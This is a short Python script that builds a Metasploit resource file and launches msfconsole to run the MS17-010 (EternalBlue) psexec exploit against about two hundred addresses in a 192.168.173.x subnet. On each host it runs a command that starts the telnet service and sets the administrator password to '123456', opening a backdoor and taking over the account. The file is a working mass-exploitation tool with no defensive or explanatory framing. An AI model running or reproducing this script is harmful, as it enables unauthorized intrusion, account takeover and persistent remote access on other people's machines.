import os

def max_payload(config,ip):
    config.write('use exploit/windows/smb/ms17_010_psexec\n')
    config.write('set rhosts '+ip+'\n')
    config.write('set cmd net start telnet&&net user administrator 123456\n')
    config.write('run -j -z\n')

def max_show():
    config=open('ms17-010.rc','a')
    for i in range(50,250):
        ip='192.168.173.'+str(i)
        max_payload(config,ip)
    config.close()
    os.system('msfconsole -r ms17-010.rc')

if __name__=='__main__':
    max_show()

